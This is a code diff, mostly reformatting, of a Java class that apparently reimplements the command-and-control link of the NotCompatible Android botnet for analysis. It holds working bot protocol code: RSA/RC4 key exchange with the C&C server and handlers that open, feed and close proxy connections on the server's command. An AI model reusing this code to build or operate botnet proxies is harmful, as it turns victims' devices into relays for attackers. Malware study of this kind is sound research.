@@ -19,8 +19,8 @@ import diff.notcompatible.c.bot.objects.Packet;
  * This is the "link" between the bot and the C&C server
  */
 public class Link extends TCPSocket {
-	
-	private final static Logger LOGGER = Logger.getLogger("session");
+
+    private final static Logger LOGGER = Logger.getLogger("session");
 
     // This is unnecessary, if we have a status of LinkStatus.ONLINE (3) we know it is encrypted
     // private boolean isEncrypted;
@@ -34,11 +34,11 @@ public class Link extends TCPSocket {
     Selector selector;
     InetSocketAddress socketAddress;
     public LinkStatus status;
-    
+
     public boolean firstRead;
 
     public Link(ThreadServer newowner) {
-    	firstRead = true;
+        firstRead = true;
         status = LinkStatus.OFFLINE;
         lastConnect = 0;
         owner = newowner;
@@ -46,7 +46,7 @@ public class Link extends TCPSocket {
         receiveBuffer = new MyBuffer();
         proxyList = new ProxyList();
     }
-    
+
     public void init() {
         receiveBuffer.clear();
         writeBuffer.clear();
@@ -56,7 +56,7 @@ public class Link extends TCPSocket {
         socketAddress = null;
         sendAndClose = false;
     }
-    
+
     public void connect(InetSocketAddress sa) {
         try {
             status = LinkStatus.KEY_EXCHANGE_START;
@@ -72,31 +72,32 @@ public class Link extends TCPSocket {
             }
         } catch (IOException e) {
             try {
-				onNoConnect(selfKey);
-			} catch (IOException e1) {
-				e1.printStackTrace();
-			}
+                onNoConnect(selfKey);
+            } catch (IOException e1) {
+                e1.printStackTrace();
+            }
         }
     }
-    
 
     public void close() {
         try {
-        	firstRead = true;
+            firstRead = true;
             onClose(selfKey);
         } catch (Exception e) {
-        	e.printStackTrace();
+            e.printStackTrace();
         }
     }
 
     public boolean isConnected() {
-        return channel.socket().isConnected() && status == LinkStatus.ONLINE;
+        return channel.socket().isConnected() && (status == LinkStatus.ONLINE);
     }
 
     /*
      * (non-Javadoc)
+     * 
      * @see diff.notcompatible.c.bot.net.TCPSocket#onClose(java.nio.channels.SelectionKey)
      */
+    @Override
     public void onClose(SelectionKey key) throws IOException {
         super.onClose(key);
         channel.close();
@@ -105,12 +106,14 @@ public class Link extends TCPSocket {
 
     /*
      * (non-Javadoc)
+     * 
      * @see diff.notcompatible.c.bot.net.TCPSocket#onConnect(java.nio.channels.SelectionKey)
      */
+    @Override
     public void onConnect(SelectionKey key) throws IOException {
         super.onConnect(key);
         LOGGER.info(" [*] Link established - sending public key for futher comms.");
-    	
+
         byte[] ba = owner.RSALocal.rsaPublicKey.getModulus().toByteArray();
         if (ba[0] == 0) {
             byte[] tmp = new byte[(ba.length - 1)];
@@ -126,8 +129,10 @@ public class Link extends TCPSocket {
 
     /*
      * (non-Javadoc)
+     * 
      * @see diff.notcompatible.c.bot.net.TCPSocket#onNoConnect(java.nio.channels.SelectionKey)
      */
+    @Override
     public void onNoConnect(SelectionKey key) throws IOException {
         super.onNoConnect(key);
         owner.connectionManager.connectBad();
@@ -136,53 +141,57 @@ public class Link extends TCPSocket {
 
     /*
      * (non-Javadoc)
+     * 
      * @see diff.notcompatible.c.bot.net.TCPSocket#onRead(java.nio.channels.SelectionKey)
      */
+    @Override
     public void onRead(SelectionKey key) throws IOException {
         super.onRead(key);
-        
+
         // Decrypt if the stream was set up already
         if (status == LinkStatus.ONLINE) {
             receiveBuffer.put(rc4Instream.crypt(readBuffer.array()));
             readBuffer.clear();
         }
-        
-        if ((readBuffer.size <= 4 && receiveBuffer.size > 0) || status == LinkStatus.ONLINE) {
+
+        if (((readBuffer.size <= 4) && (receiveBuffer.size > 0)) || (status == LinkStatus.ONLINE)) {
             parseCommand();
         } else {
-        	// Get data length and shift over the size
+            // Get data length and shift over the size
             int dataLength = readBuffer.asDWord();
             readBuffer.shift(4);
             LOGGER.info(" [!] Received " + dataLength + " bytes of data, but no encryption has been set up!");
             if (dataLength > readBuffer.size) {
-            	LOGGER.warning(" [!] Data claims we received " + dataLength + " bytes of data, larger than what the read buffer says we have - exiting!");
+                LOGGER.warning(" [!] Data claims we received " + dataLength
+                                + " bytes of data, larger than what the read buffer says we have - exiting!");
                 close();
             } else {
-            	LOGGER.info(" [+] Attempting to initialize encryption");
-            	// Copy first section, which is the encrypted with this bots public RSA key that we just sent to the server.
-            	// The decrypted part is then used as the rc4 key to decode the rest
+                LOGGER.info(" [+] Attempting to initialize encryption");
+                // Copy first section, which is the encrypted with this bots public RSA key that we just sent to the
+                // server.
+                // The decrypted part is then used as the rc4 key to decode the rest
                 byte[] encryptedKey = new byte[dataLength];
                 System.arraycopy(readBuffer.array(), 0, encryptedKey, 0, encryptedKey.length);
                 readBuffer.shift(dataLength);
-                
+
                 // Decrypt the key used to initialize the rc4 streams
                 byte[] rc4key = new byte[100];
                 System.arraycopy(owner.RSALocal.decrypt(encryptedKey), 1, rc4key, 0, rc4key.length);
-                
+
                 // Configure rc4 objects and toggle encryption
                 rc4Instream = new RC4(rc4key);
                 rc4Outstream = new RC4(rc4key);
-                
+
                 // Toggle status, respond to server and mark connection as OK
                 status = LinkStatus.ONLINE;
                 sendHello();
                 owner.connectionManager.connectOk();
-                
+
                 // Check for any extra commands
                 receiveBuffer.put(rc4Instream.crypt(readBuffer.array()));
                 readBuffer.clear();
                 // Parse any command we got out of the above buffer
-                if (receiveBuffer.size > 0 || status == LinkStatus.ONLINE) {
+                if ((receiveBuffer.size > 0) || (status == LinkStatus.ONLINE)) {
                     parseCommand();
                 }
             }
@@ -195,10 +204,10 @@ public class Link extends TCPSocket {
      * @param received
      */
     private void recvCONN(Packet received) {
-    	LOGGER.info(" [*] Parsing CONN (proxy link) packet.");
-    	
+        LOGGER.info(" [*] Parsing CONN (proxy link) packet.");
+
         Packet channelPacket = received.getByName("CH");
-        if (channelPacket == null || channelPacket.buffer.size != 4) {
+        if ((channelPacket == null) || (channelPacket.buffer.size != 4)) {
             sendError(1, 0);
         } else {
             int channel = channelPacket.asDWord();
@@ -206,13 +215,13 @@ public class Link extends TCPSocket {
                 sendError(2, 0);
             } else {
                 Packet portPacket = received.getByName("PORT");
-                if (portPacket == null | portPacket.buffer.size != 2) {
+                if ((portPacket == null) | (portPacket.buffer.size != 2)) {
                     sendError(1, 0);
                 } else {
                     int port = portPacket.asPort();
                     Packet ipPacket = received.getByName("IP");
                     Packet domPacket = received.getByName("DOM");
-                    if (ipPacket == null & domPacket == null) {
+                    if ((ipPacket == null) & (domPacket == null)) {
                         sendError(1, 0);
                     } else {
                         String server = ipPacket != null ? ipPacket.asIP() : domPacket.asString();
@@ -220,7 +229,8 @@ public class Link extends TCPSocket {
                         proxyLink.ch = channel;
                         proxyLink.connect(server, port);
                         proxyList.add(proxyLink);
-                        LOGGER.info(" [+] New ProxyLink created to [ " + server + " / " + port + " ] on channel [ " + channel + " ]");
+                        LOGGER.info(" [+] New ProxyLink created to [ " + server + " / " + port + " ] on channel [ "
+                                        + channel + " ]");
                     }
                 }
             }
@@ -229,13 +239,14 @@ public class Link extends TCPSocket {
 
     /**
      * Receive and parse SEND (data) commands
+     * 
      * @param send
      */
     private void recvSEND(Packet send) {
-    	LOGGER.info(" [*] Parsing SEND packet.");
-    	
+        LOGGER.info(" [*] Parsing SEND packet.");
+
         Packet channelPacket = send.getByName("CH");
-        if (channelPacket == null | channelPacket.buffer.size != 4) {
+        if ((channelPacket == null) | (channelPacket.buffer.size != 4)) {
             sendError(1, 0);
         } else {
             ProxyLink proxyLink = proxyList.getByChannel(channelPacket.asDWord());
@@ -243,14 +254,15 @@ public class Link extends TCPSocket {
                 sendError(3, 0);
             } else {
                 Packet dataTransferPacket = send.getByName("DT");
-                if (dataTransferPacket == null | dataTransferPacket.buffer.size == 0) {
+                if ((dataTransferPacket == null) | (dataTransferPacket.buffer.size == 0)) {
                     sendError(1, 0);
                 } else {
                     try {
                         proxyLink.send(dataTransferPacket.buffer.array());
-                        LOGGER.info(" [+] Data sent to ProxyLink channel [ " + proxyLink.ch + " ] with data length [ " + dataTransferPacket.buffer.array().length + " ] ");
+                        LOGGER.info(" [+] Data sent to ProxyLink channel [ " + proxyLink.ch + " ] with data length [ "
+                                        + dataTransferPacket.buffer.array().length + " ] ");
                     } catch (Exception exception) {
-                    	exception.printStackTrace();
+                        exception.printStackTrace();
                         proxyLink.close();
                     }
                 }
@@ -258,18 +270,19 @@ public class Link extends TCPSocket {
         }
     }
 
-	private void recvSET(Packet set) {
-		LOGGER.info(" [*] Parsing SET (new setting) packet.");
-    	Packet dataPacket = set.getByName("DATA");
+    private void recvSET(Packet set) {
+        LOGGER.info(" [*] Parsing SET (new setting) packet.");
+        Packet dataPacket = set.getByName("DATA");
         if (dataPacket != null) {
-        	Packet signPacket = set.getByName("Sign");
+            Packet signPacket = set.getByName("Sign");
             if (signPacket != null) {
-            	Packet lidPacket = dataPacket.getByName("LID");
-            	// Verify the set packet
-                if (lidPacket != null &&
-                		owner.config.packet.getByName("SET").getByName("DATA").getByName("LID").asInt64() < lidPacket.asInt64() &&
-                		owner.RSAGlobal.check(dataPacket.getDigest(), signPacket.array())) {
-                	// Delete old one and save new config
+                Packet lidPacket = dataPacket.getByName("LID");
+                // Verify the set packet
+                if ((lidPacket != null)
+                                && (owner.config.packet.getByName("SET").getByName("DATA").getByName("LID").asInt64() < lidPacket
+                                                .asInt64())
+                                && owner.RSAGlobal.check(dataPacket.getDigest(), signPacket.array())) {
+                    // Delete old one and save new config
                     owner.config.packet.delete("SET");
                     owner.config.packet.add(dataPacket);
                     owner.config.save(owner.sessionDirectory);
@@ -282,31 +295,32 @@ public class Link extends TCPSocket {
 
     /**
      * Receive and parse the shut down ProxyLink command
+     * 
      * @param killProxyLinkPacket
      */
     private void recvSHUT(Packet killProxyLinkPacket) {
-    	LOGGER.info(" [*] Parsing SHUT (kill ProxyLinkPacket) packet.");
-    	
-    	// Ensure channel Packet is properly formed
+        LOGGER.info(" [*] Parsing SHUT (kill ProxyLinkPacket) packet.");
+
+        // Ensure channel Packet is properly formed
         Packet channelPacket = killProxyLinkPacket.getByName("CH");
-        if (channelPacket == null | channelPacket.buffer.size != 4) {
+        if ((channelPacket == null) | (channelPacket.buffer.size != 4)) {
             sendError(1, 0);
         } else {
-        	// Find ProxyLink
+            // Find ProxyLink
             ProxyLink proxyLink = proxyList.getByChannel(channelPacket.asDWord());
             if (proxyLink == null) {
-            	// ProxyLink did not exist
+                // ProxyLink did not exist
                 sendError(3, 0);
             } else {
-            	// Ensure we have 
-                if (killProxyLinkPacket.getByName("DT") == null | channelPacket.buffer.size == 0) {
+                // Ensure we have
+                if ((killProxyLinkPacket.getByName("DT") == null) | (channelPacket.buffer.size == 0)) {
                     sendError(1, 0);
                 } else {
                     // Ensure we flush the write buffer if it is not yet done
-                	if (proxyLink.writeBuffer.size > 0) {
-                		proxyLink.sendAndClose = true;
-                	}
-                	// kill ProxyLink
+                    if (proxyLink.writeBuffer.size > 0) {
+                        proxyLink.sendAndClose = true;
+                    }
+                    // kill ProxyLink
                     proxyLink.close();
                 }
             }
@@ -314,87 +328,87 @@ public class Link extends TCPSocket {
     }
 
     private void sendHello() {
-    	LOGGER.info(" [*] Sending hello packet.");
-    	Packet helloPacket = new Packet();
+        LOGGER.info(" [*] Sending hello packet.");
+        Packet helloPacket = new Packet();
         helloPacket.tag = "HELO";
-        
+
         Packet versionPacket = helloPacket.add();
         versionPacket.tag = "VER";
         versionPacket.buffer.putDword(2);
-        
+
         Packet uuidPacket = helloPacket.add();
         uuidPacket.tag = "UUID";
         uuidPacket.buffer.put(owner.config.packet.getByName("UUID").array());
-        
+
         Packet portPacket = helloPacket.add();
         portPacket.tag = "PORT";
         portPacket.buffer.putWord(owner.config.packet.getByName("PORT").asPort());
-        
+
         Packet groupPacket = helloPacket.add();
         groupPacket.tag = "GROUP";
         groupPacket.buffer.putWord(owner.config.packet.getByName("GROUP").asWord());
-        
+
         // Hacky to get around this, looks like a bug in malware
         Packet ldGroupPacket = helloPacket.add();
         ldGroupPacket.tag = "LDGROUP";
         int ldGroupWord = 0;
-        if(owner.config.packet.getByName("LDGROUP") != null) {
-        	ldGroupWord = owner.config.packet.getByName("LDGROUP").asWord();
+        if (owner.config.packet.getByName("LDGROUP") != null) {
+            ldGroupWord = owner.config.packet.getByName("LDGROUP").asWord();
         }
         ldGroupPacket.buffer.putWord(ldGroupWord);
-        
+
         Packet lidPacket = helloPacket.add();
         lidPacket.tag = "LID";
         // Normally it's in SET, removed here though .getByName("SET")
         lidPacket.buffer.putInt64(owner.config.packet.getByName("DATA").getByName("LID").asInt64());
-        
+
         Packet connectionTypePacket = helloPacket.add();
         connectionTypePacket.tag = "CT";
         connectionTypePacket.buffer.putDword(owner.connectionType);
-        
+
         // Unknown packet
         if (owner.config.packet.getByName("FB") != null) {
             owner.config.packet.delete("FB");
             owner.config.save(owner.sessionDirectory);
             helloPacket.add().tag = "FB";
         }
-        
+
         // Add port opened tag
         if (owner.isOpenPort) {
             helloPacket.add().tag = "OP";
         }
-        
+
         sendEncrypt(helloPacket.pack());
     }
 
     private void sendPong() {
         Packet pongPacket = new Packet();
-        
+
         pongPacket.tag = "PONG";
-        
+
         sendEncrypt(pongPacket.pack());
     }
 
     public void parseCommand() {
         Packet packet = null;
-        while((packet = Packet.unpack(receiveBuffer)) != null) {
+        while ((packet = Packet.unpack(receiveBuffer)) != null) {
             if (packet.tag.equals("PING")) {
                 sendPong();
-            }else if (packet.tag.equals("HUBLIST")) {
+            } else if (packet.tag.equals("HUBLIST")) {
                 owner.hubList.loadFromPacket(packet);
                 owner.saveHubList();
-            }else if (packet.tag.equals("UDPHUBLIST")) {
+            } else if (packet.tag.equals("UDPHUBLIST")) {
                 owner.udpList.loadFromPacket(packet);
                 owner.saveUDPHubList();
-            }else if (packet.tag.equals("SETGROUP")) {
+            } else if (packet.tag.equals("SETGROUP")) {
                 owner.connectionManager.setGroup(packet.asWord());
                 owner.config.packet.getByName("GROUP").buffer.clear();
                 owner.config.packet.getByName("GROUP").buffer.put(packet.array());
                 owner.config.save(owner.sessionDirectory);
                 close();
-            }else if (packet.tag.equals("SET")) {
+            } else if (packet.tag.equals("SET")) {
                 recvSET(packet);
-            }else if (packet.tag.equals("SETV")) {
+            } else if (packet.tag.equals("SETV")) {
                 Packet tmpp = packet.getByName("INDX");
                 if (tmpp != null) {
                     owner.connectionManager.setIndex(tmpp.asDWord());
@@ -408,78 +422,81 @@ public class Link extends TCPSocket {
                     owner.config.save(owner.sessionDirectory);
                     close();
                 }
-            }else if (packet.tag.equals("CONN")) {
+            } else if (packet.tag.equals("CONN")) {
                 recvCONN(packet);
-            }else if (packet.tag.equals("SHUT")) {
+            } else if (packet.tag.equals("SHUT")) {
                 recvSHUT(packet);
-            }else if (packet.tag.equals("SEND")) {
+            } else if (packet.tag.equals("SEND")) {
                 recvSEND(packet);
-            }else {
-            	LOGGER.warning(" [!] Unknown packet hit using tag : [ " + packet.tag + " ]");
-            	LOGGER.info("Received data dump; ");
-            	LOGGER.info(Hex.toHexString(receiveBuffer.array()));
+            } else {
+                LOGGER.warning(" [!] Unknown packet hit using tag : [ " + packet.tag + " ]");
+                LOGGER.info("Received data dump; ");
+                LOGGER.info(Hex.toHexString(receiveBuffer.array()));
             }
         }
     }
 
-
     /**
      * Send an error packet about the ProxyLink back to C&C
-     * @param num Error number
-     * @param ch Channel which contained the error
+     * 
+     * @param num
+     *            Error number
+     * @param ch
+     *            Channel which contained the error
      */
     public void sendError(int num, int ch) {
-    	LOGGER.warning(" [*] Sending error packet.");
-    	Packet errorPacket = new Packet();
-    	errorPacket.tag = "ERR";
-    	
+        LOGGER.warning(" [*] Sending error packet.");
+        Packet errorPacket = new Packet();
+        errorPacket.tag = "ERR";
+
         Packet errorNumber = errorPacket.add();
         errorNumber.tag = "N";
         errorNumber.buffer.putDword(num);
-        
+
         Packet channelPacket = errorPacket.add();
         channelPacket.tag = "CH";
         channelPacket.buffer.putDword(ch);
-        
+
         sendEncrypt(errorPacket.pack());
     }
 
     public void sendGetHubList() {
-    	Packet getHubListPacket = new Packet();
-    	
+        Packet getHubListPacket = new Packet();
+
         getHubListPacket.tag = "GETHUBLIST";
-        
+
         sendEncrypt(getHubListPacket.pack());
     }
 
     public void sendOP() {
-    	LOGGER.info(" [*] Sending OP (open port) packet.");
-    	Packet opPacket = new Packet();
-    	
-    	opPacket.tag = "OP";
-        
-    	sendEncrypt(opPacket.pack());
+        LOGGER.info(" [*] Sending OP (open port) packet.");
+        Packet opPacket = new Packet();
+
+        opPacket.tag = "OP";
+
+        sendEncrypt(opPacket.pack());
     }
 
     /**
      * Use RC4 to cipher data and send to C&C
+     * 
      * @param data
      */
     public void sendEncrypt(byte[] data) {
         if (isConnected()) {
-        	try {
+            try {
                 send(rc4Outstream.crypt(data));
             } catch (IOException e) {
                 close();
             }
         }
     }
-    
+
     public static enum LinkStatus {
-    	OFFLINE, // No connection
-    	KEY_EXCHANGE_START, // Connection started, need crypto
-    	KEY_EXCHANGE_DONE, // Key sent to C&C
-    	ONLINE // Key exchange done and valid
+        OFFLINE, // No connection
+        KEY_EXCHANGE_START, // Connection started, need crypto
+        KEY_EXCHANGE_DONE, // Key sent to C&C
+        ONLINE // Key exchange done and valid
     }
 
 }
